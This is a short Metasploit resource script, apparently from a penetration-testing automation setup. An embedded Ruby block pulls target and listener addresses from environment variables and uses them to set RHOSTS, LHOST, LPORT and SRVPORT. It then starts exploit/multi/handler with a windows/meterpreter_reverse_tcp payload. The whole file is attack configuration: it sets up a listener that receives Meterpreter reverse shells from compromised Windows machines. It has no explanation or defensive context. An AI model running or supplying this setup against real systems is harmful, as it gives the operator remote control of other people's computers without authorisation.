 <ruby>
 run_single("setg RHOSTS " + ENV['ip'])
 run_single("setg SRVHOST " + ENV['lip'])
 run_single("setg LHOST " + ENV['lip'])
 run_single("use exploit/multi/handler")
 run_single("set LPORT " + ENV['lport'])
 run_single("set SRVPORT 80")
 run_single("set payload windows/meterpreter_reverse_tcp")
 </ruby>
